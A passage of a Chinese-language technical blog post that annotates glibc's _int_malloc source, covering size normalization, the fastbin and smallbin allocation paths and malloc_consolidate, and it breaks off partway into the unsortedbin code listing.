<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>首先定义了一众局部变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span><span class="comment">//本变量是用户希望大小size的计算值,也就是实际的堆块大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span><span class="comment">//本变量用于记录nb大小的堆块属于的桶子下标</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span>;<span class="comment">//桶子头指针</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span><span class="comment">//命中堆块</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span>	<span class="comment">//victim命中堆块本来的大小</span></span><br><span class="line"><span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span>	<span class="comment">//victim_index命中堆块属于的桶子下标</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span>	<span class="comment">//切割一个大块,剩下的部分被称为remainder</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span>	<span class="comment">//剩余部分的大小</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span>	<span class="comment">//binmap下标,用于记录一个桶子属于四个block之一的哪一个</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span>		<span class="comment">//用于记录一共桶子属于其block中的哪一位	</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span>	<span class="comment">//binmap[map],作为binmap的下标,有0,1,2,3四个取值</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span>		<span class="comment">//取桶子头之后一般会让bck指向之前的第一个堆块,fwd指向桶子头,然后头插</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="计算实际大小"><a href="#计算实际大小" class="headerlink" title="计算实际大小"></a>计算实际大小</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checked_request2size (bytes, nb);</span><br></pre></td></tr></table></figure>

<p>这个宏的作用是将请求的bytes,按照对齐等规则,转化为实际上要申请的大小nb</p>
<p>经过此宏之后,int_malloc中使用的都是nb,不再使用bytes作为分配大小</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#define checked_request2size(req, sz)                             \</span><br><span class="line">  if (REQUEST_OUT_OF_RANGE (req)) &#123;					      \</span><br><span class="line">      __set_errno (ENOMEM);						      \</span><br><span class="line">      return 0;								      \</span><br><span class="line">    &#125;									      \</span><br><span class="line">  (sz) = request2size (req);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line">  #  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure>

<p>如果请求大小req+SIZE_SZ+对齐掩码小于最小分配大小,则按照最小分配大小来</p>
<p>否则将上述值和对齐掩码的补码按位与</p>
<p>在x64上</p>
<p>MALLOC_ALIGNMENT&#x3D;2*SIZE_SZ&#x3D;16</p>
<p>MALLOC_ALIGN_MASK&#x3D;15</p>
<p>request2size(req) &#x3D;(req+8+15 )&amp;11111110000</p>
<p>假设req&#x3D;0x10,即用户希望得到一块至少有0x10个字节的堆块则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request2size(req) </span><br><span class="line">    =(<span class="number">16</span>+<span class="number">8</span>+<span class="number">15</span> )&amp;<span class="number">11111110000</span></span><br><span class="line">    =(<span class="number">0b10000</span>+<span class="number">0b1000</span>+<span class="number">0b1111</span>)&amp;<span class="number">111111110000</span></span><br><span class="line">    =<span class="number">0b100111</span>&amp;<span class="number">0b110000</span></span><br><span class="line">    =<span class="number">0b100000</span></span><br><span class="line">    =<span class="number">32</span></span><br></pre></td></tr></table></figure>

</blockquote>
<h4 id="检查当前是否有可用分配区"><a href="#检查当前是否有可用分配区" class="headerlink" title="检查当前是否有可用分配区"></a>检查当前是否有可用分配区</h4><p>然后检查av分配区指针是否为空,显然这里的编译器优化是期望其不空的</p>
<p>但是如果真的av为空,没有可用分配区的画,则调用sysmalloc直接解决分配问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果果真为空则调用sysmalloc函数,</p>
<p>sysmalloc被调用的情况是这样的:</p>
<p>当av分配区的topchunk大小不足以满足用户需求,调用sysmalloc扩大topchunk大小或者更换topchunk</p>
<p>比如调用sbrk系统调用扩大topchunk的大小</p>
<p>sysmalloc如果能成功分配堆块,则p指向该堆块,然后<code>alloc_perturb</code>将p指向堆块的用户空间的前bytes个字节,初始化为<code>perturb_byte^0xff</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">alloc_perturb</span> <span class="params">(<span class="type">char</span> *p, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fastbins区分配"><a href="#fastbins区分配" class="headerlink" title="fastbins区分配"></a>fastbins区分配</h4><p>经过两个检查之后,如果控制流执行至此,说明需要分配的堆块不是很离谱,起码不用麻烦sbrk额外分配大块内存</p>
<p>那么首先尝试使用fastbins进行分配</p>
<blockquote>
<p>在该区分配的主要流程:</p>
<p>1.根据实际堆块大小nb计算应该落在哪个桶子里</p>
<p>2.从该桶子顶取出一个堆块交给用户</p>
<p>3.将该桶子中剩余的部分重新挂到桶子头上</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;<span class="comment">//首先判断,nb这个大小,是否落在fastbins管理的堆块大小范围内</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//控制流至此说明nb大小适合fastbins分配,下面需要判断fastbins里面有没有空闲堆块</span></span><br><span class="line"></span><br><span class="line">    idx = fastbin_index (nb);<span class="comment">//根据nb大小计算落在fastbin的哪个桶里面,返回值是数组下标</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//&amp;fastbins[idx]就是对应桶的桶子头</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//*解引用,也就是拿出fastbins[idx]指向的第一个堆块,pp拷贝堆块的指针</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;<span class="comment">//如果上来victim就为空,说明桶子头fastbins[idx]指向NULL,也就是这个桶是空的</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> (</span><br><span class="line">    		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">          )!= victim</span><br><span class="line">        <span class="comment">//victim指向链栈顶,然后把他取下来,把原来的次顶堆块挂到fb指针上,返回值pp是victim</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)<span class="comment">//如果victim不为0说明对应桶中确实有堆块,并且已经交给victim保管</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;<span class="comment">//victim获取到的fastbin堆块,再检查一下发现不应该属于其原本的桶中,说明有鬼</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);<span class="comment">//重新分配的堆块检查,这里指的是从topchunk割下来然后free进入各种bins然后又被重新利用的堆块</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="smallbins区分配"><a href="#smallbins区分配" class="headerlink" title="smallbins区分配"></a>smallbins区分配</h4><p>bins数组中维护的是桶子头的fd,bk指针,一个smallbin头需要两个bins数组元素存放,一个记录fd,一个记录bk,</p>
<p>看图一眼顶针</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin1.png" alt="smallbin1"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);<span class="comment">//计算nb所在的smallbins下标</span></span><br><span class="line">    bin = bin_at (av, idx);<span class="comment">//取smallbin[idx]桶子头节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//last(bin)=bin-&gt;fd,如果bin的指针还是指向bin说明这个桶子是空的</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          malloc_consolidate (av);<span class="comment">//堆块合并</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;<span class="comment">//下面要将victim从双向链表上摘下来</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//检查victim-&gt;bk指向的堆块,其fd指针是否是victim</span></span><br><span class="line">              &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">              &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);<span class="comment">//经过malloc_consolidate后,如果本块和物理相邻的前块都没使用,则会合并起来</span></span><br><span class="line">            <span class="comment">//把victim抠下来,然后把桶子头和victim-&gt;bk连起来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//标记非主分配区</span></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//获取data基地址指针</span></span><br><span class="line">            alloc_perturb (p, bytes);<span class="comment">//填充</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>





<h4 id="fastbin合并"><a href="#fastbin合并" class="headerlink" title="fastbin合并"></a>fastbin合并</h4><p>注意有两种到达此处的可能,要么是一个<code>smallbin</code>的申请,但是没在<code>smallbin</code>中找到对应堆块,要么是一个largebin的申请</p>
<p>前者<strong>不会</strong>引起<code>fastbin</code>的合并,后者会首先合并<code>fastbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line"> &#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> ((victim = last(bin)) != bin) <span class="comment">// bin桶子中的最后一个,如果不是bin这个头节点自己,那么说明这个桶子里至少有一个空闲堆块</span></span><br><span class="line">   &#123;</span><br><span class="line">   ...</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   idx = largebin_index(nb);</span><br><span class="line">   <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">     malloc_consolidate(av);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>fastbin</code>合并之后的堆块,都会被放到<code>unsortedbin</code>中,其目的是给<code>unsortedbin</code>区的尝试分配增大可能性</p>
<p>看上去此时将<code>fastbin</code>进行合并,有损效率,但这是为了防止<code>fastbin</code>截留堆块导致堆空间碎片化(<code>fastbin</code>中的堆块依然保持使用状态,不会被其他临近堆块向前或者向后合并.因此需要对其进行主动合并释放)</p>
<p>并且经验表明,一个程序要么主要使用<code>smallbin</code>大小的堆块,要么主要使用<code>largebin</code>大小的堆块</p>
<p>因此对<code>fastbin</code>的合并操作不会被经常调用</p>
<p>具体的<code>fastbin</code>合并过程,在<code>malloc_consolidate</code>中</p>
<h5 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h5><blockquote>
<p>用于<code>fastbin</code>区的合并</p>
<p>两层循环,外层循环遍历<code>fastbin</code>桶子头</p>
<p>内层循环遍历挂载一个桶子头上的堆块链表</p>
<p>对每个堆块,尝试进行向前合并和向后合并,注意只会分别执行一次</p>
<p>如果尝试向后合并时发现和<code>topchunk</code>相邻则并入<code>topchunk</code></p>
<p>如果尝试向前合并和向后合并之后,没有并入topchunk会被头插法链接到<code>unsortedbin</code>的双向链表上 </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr *maxfb;       <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr p;              <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr nextp;          <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr unsorted_bin;   <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr first_unsorted; <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span> nextinuse;</span><br><span class="line">  mchunkptr bck;</span><br><span class="line">  mchunkptr fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>)<span class="comment">//如果max_faxt值为空,则说明堆还没有初始化</span></span><br><span class="line">  &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin(av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      p = atomic_exchange_acq(fb, <span class="number">0</span>); <span class="comment">// p=fb,fb++</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123; <span class="comment">// 释放快桶子p上挂着的所有堆块</span></span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd; <span class="comment">// 先取后继</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA); <span class="comment">// 撤销flag</span></span><br><span class="line">          nextchunk = chunk_at_offset(p, size);            <span class="comment">// 物理上相邻的下一个堆块</span></span><br><span class="line">          nextsize = chunksize(nextchunk);   </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//向前合并</span></span><br><span class="line">          &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));<span class="comment">//取物理上前一个相邻的堆块基址,作为合并堆块的基址</span></span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//如果后面和topchunk相邻则和topchunk合并,否则尝试向后合并</span></span><br><span class="line">          &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">            &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);<span class="comment">//如果物理上后面相邻的堆块没在使用则向后合并</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;<span class="comment">//取第一个unsorted_bin上悬挂的堆块</span></span><br><span class="line">            unsorted_bin-&gt;fd = p;<span class="comment">//头插法</span></span><br><span class="line">            first_unsorted-&gt;bk = p;<span class="comment">//将p链接到unsorted_bin和p之间</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//如果这个合并堆块在largebin范围内则初始化其nextsize指针</span></span><br><span class="line">            &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);<span class="comment">//p后面就是topchunk,p合并到topchunk</span></span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//遍历整个fastbin,直到fastbin桶子头哨兵maxfb</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_init_state(av);<span class="comment">//初始化堆</span></span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h4 id="unsortedbin区分配"><a href="#unsortedbin区分配" class="headerlink" title="unsortedbin区分配"></a>unsortedbin区分配</h4><h5 id="unsortedbin尝试分配-与-归类"><a href="#unsortedbin尝试分配-与-归类" class="headerlink" title="unsortedbin尝试分配 与 归类"></a>unsortedbin尝试分配 与 归类</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 